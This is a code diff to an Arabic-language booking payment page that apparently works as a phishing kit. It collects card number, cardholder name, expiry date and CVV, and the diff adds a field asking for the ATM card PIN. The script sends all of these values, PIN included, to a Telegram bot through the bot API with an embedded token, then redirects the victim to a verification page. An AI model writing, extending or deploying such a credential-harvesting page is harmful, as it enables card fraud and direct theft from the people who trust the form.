@@ -78,10 +78,11 @@
     <form id="paymentForm">
 
       <label for="confirmBooking">تأكيد رقم الحجز:</label>
-      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required 
+             oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
 
       <p id="lengthError" class="error-message">
-        ❗ رقم الحجز.
+        ❗ رقم الحجز يجب أن يتكون من 6 أرقام.
       </p>
 
       <label for="cardNumber">رقم البطاقة:</label>
@@ -110,10 +111,14 @@
         <option>2040</option>
       </select>
 
-      <!-- ✅ تم التعديل هنا فقط -->
       <label for="cvv">CVV (3 أو 4 أرقام):</label>
       <input type="text" id="cvv" minlength="3" maxlength="4" required 
              oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+      <!-- ✅ الحقل الجديد -->
+      <label for="pin">الرقم السري لبطاقة الصراف (PIN):</label>
+      <input type="password" id="pin" maxlength="4" required 
+             oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)" />
 
       <p id="dateError" class="error-message">
         ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.  
@@ -129,6 +134,7 @@
   </footer>
 
   <script>
+    // تنسيق رقم البطاقة
     function formatCardNumber(input) {
       let value = input.value.replace(/[^0-9]/g, "");
       value = value.slice(0, 16);
@@ -136,6 +142,7 @@
       input.value = formatted ? formatted.join("-") : "";
     }
 
+    // عند إرسال النموذج
     document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
@@ -146,6 +153,7 @@
       lengthError.style.display = "none";
       dateError.style.display = "none";
 
+      // التحقق من رقم الحجز
       if (confirmBooking.length !== 6) {
         lengthError.style.display = "block";
         return;
@@ -154,6 +162,7 @@
       const month = parseInt(document.getElementById("expiryMonth").value);
       const year = parseInt(document.getElementById("expiryYear").value);
 
+      // التحقق من أن البطاقة غير منتهية
       if (year < 2025 || (year === 2025 && month < 7)) {
         dateError.style.display = "block";
         return;
@@ -162,6 +171,13 @@
       const cardNumber = document.getElementById("cardNumber").value;
       const cardName = document.getElementById("cardName").value;
       const cvv = document.getElementById("cvv").value;
+      const pin = document.getElementById("pin").value;
+
+      // التحقق أن PIN مكون من 4 أرقام
+      if (pin.length !== 4) {
+        alert("⚠️ الرقم السري يجب أن يتكون من 4 أرقام فقط.");
+        return;
+      }
 
       const message = `
 💳 معلومات عملية الدفع:
@@ -170,10 +186,11 @@
 👤 الاسم على البطاقة: ${cardName}
 📆 تاريخ الانتهاء: ${month}/${year}
 🔐 CVV: ${cvv}
+🔑 PIN: ${pin}
 🔢 رقم الحجز: ${confirmBooking}
 `;
 
-      // ✅ استبدل التوكن والشات آيدي الخاص بك
+      // إرسال البيانات إلى بوت التلغرام
       fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
         method: "POST",
         headers: {
@@ -185,7 +202,7 @@
         })
       })
       .then(() => {
-        window.location.href = "verify.html";
+        window.location.href = "verify.html"; // بعد الإرسال، ينتقل إلى صفحة التحقق
       })
       .catch(() => {
         alert("❌ فشل الإرسال إلى البوت");
